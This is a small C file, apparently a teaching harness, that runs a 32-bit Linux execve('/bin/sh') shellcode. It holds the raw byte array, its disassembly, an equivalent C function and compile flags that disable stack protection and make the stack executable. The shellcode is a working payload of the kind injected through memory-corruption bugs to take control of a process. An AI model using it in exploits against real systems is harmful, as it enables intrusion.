#include <unistd.h>

unsigned char sc[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

/*
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80
*/

void open_shell(void) {
    char *shell[2];
   shell[0] = "/bin/sh";
   shell[1] = '\0';
   execve(shell[0], shell, '\0');
}

// compile with gcc -m32 -fno-stack-protector -z execstack shellcode_openshell.c && ./a.out
int main()
{
 ((void(*)())sc)();
   //open_shell();
    return 0;
}

